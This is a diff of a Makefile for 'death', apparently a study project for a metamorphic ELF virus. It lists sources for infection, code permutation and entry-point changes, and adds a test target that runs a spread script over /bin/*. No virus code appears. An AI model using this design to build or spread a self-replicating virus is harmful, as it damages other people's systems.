@@ -2,35 +2,41 @@
 
 NAME = death
 
-# SRC File order matters!
-# [LOADER]    loader_entry -> virus
-# [VIRUS]     virus        -> _start
-# [LAUNCHER]  _start       -> EOF
+# SRC file order matters!
+#
+# [LOADER]   loader.s: loader_entry -> virus
+# [VIRUS]    virus.c:  virus        -> _start
+# [LAUNCHER] start.c:  _start       -> EOF
 
 SRC =	loader.s                       \
 	virus/virus.c                  \
 	virus/accessors.c              \
 	virus/adjust_references.c      \
+	virus/change_entry.c           \
 	virus/copy_virus_to_clone.c    \
 	virus/copy_client_to_clone.c   \
+	virus/debug.c                  \
 	virus/disasm_block.c           \
 	virus/disasm_jumps.c           \
+	virus/disasm_operands.c        \
 	virus/disasm_length.c          \
-	virus/elf64_iterators.c        \
+	virus/disasm_step.c            \
+	virus/elf_iterators.c          \
 	virus/file_iterator.c          \
 	virus/find_entry.c             \
 	virus/generate_seed.c          \
 	virus/infect.c                 \
 	virus/infection_engine.c       \
-	virus/log.c                    \
+	virus/jumps.c                  \
+	virus/logs.c                   \
 	virus/metamorph_clone.c        \
+	virus/not_infected.c           \
 	virus/permutate_blocks.c       \
+	virus/permutate_instructions.c \
 	virus/permutate_registers.c    \
-	virus/random.c                 \
 	virus/setup_virus_header.c     \
 	virus/syscall.c                \
 	virus/utils.c                  \
-	virus/write_jump.c             \
 	start.c
 
 CC = clang
@@ -84,6 +90,7 @@ ${NAME}: ${OBJ}
 	@${CC} ${LDFLAGS} -o $@ ${OBJ}
 	@echo ${G}Success"   "[${NAME}]${X}
 	mkdir -p /tmp/test /tmp/test2
+	rm -rf /tmp/test/* /tmp/test2/*
 	cp /bin/ls /tmp/test/
 
 ${OBJDIR}/%.o: ${SRCDIR}/%.s
@@ -101,16 +108,19 @@ ${OBJDIR}/%.o: ${SRCDIR}/%.c
 # ---------------------------------- Debug ----------------------------------- #
 
 logs: fclean
-	${MAKE} all CFLAGS:="-DLOGS -g" ASFLAGS:="-DLOGS -g"
+	${MAKE} all CFLAGS:="-DLOGS -DERRORS -g" ASFLAGS:="-DLOGS -DERRORS -g"
 
 errors: fclean
 	${MAKE} all CFLAGS:="-DERRORS -g" ASFLAGS:="-DERRORS -g"
 
-debug: fclean
-	${MAKE} all CFLAGS:="-DDEBUG -g" ASFLAGS:="-DDEBUG -g"
+debug_blocks: fclean
+	${MAKE} all CFLAGS:="-DDEBUG_BLOCKS -g" ASFLAGS:="-DDEBUG_BLOCKS -g"
+
+debug_operands: fclean
+	${MAKE} all CFLAGS:="-DDEBUG_OPERANDS -g" ASFLAGS:="-DDEBUG_OPERANDS -g"
 
 test:
-	./scripts/test_spread.bash re 1000 /bin/ls /bin/sh /bin/pwd /bin/uname
+	./scripts/test_spread.bash re 100 /bin/*
 
 # --------------------------------- General ---------------------------------- #
 
@@ -122,7 +132,6 @@ fclean: clean
 	@echo ${R}Cleaning"  "[${NAME}]...${X}
 	@/bin/rm -f ${NAME}
 	@/bin/rm -Rf ${NAME}.dSYM
-	@/bin/rm -f /tmp/test/* /tmp/test2/*
 
 re: fclean all
 
@@ -141,11 +150,11 @@ art:
 	@echo "          \\\\\\           // "
 	@echo "           \\\\\\ _     _ // "
 	@echo "      "${BG}" -----"${BB}"'(|)"${BG}"---"${BB}"(|)'"${BG}"----- "
-	@echo "       ------"${BB}","${BG}"-------"${BB}","${BG}"----- "${BB}
+	@echo "       ------"${BB}","${BG}"-------"${BB}","${BG}"------ "${BB}
 	@echo "            / .' : '. \\ "
 	@echo "           '-'._.-._.'-' "
 	@echo ${X}
 
-.PHONY: all clean fclean re logs errors debug art
+.PHONY: all clean fclean re logs errors debug_blocks debug_operands test art
 
 -include ${DEP}
